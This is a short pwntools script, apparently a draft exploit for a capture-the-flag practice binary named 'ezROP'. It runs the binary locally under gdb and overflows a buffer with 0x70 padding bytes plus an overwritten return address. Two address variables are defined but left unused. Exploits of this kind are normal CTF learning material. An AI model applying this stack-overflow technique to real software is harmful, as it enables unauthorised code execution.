from pwn import *

r = process("./ezROP")
gdb.attach(r, api=True)

readn = 0x401304
ret = 0x401533

payload = b" "*0x70 + p64(0x0000000000401343)

r.sendline(payload)
r.interactive()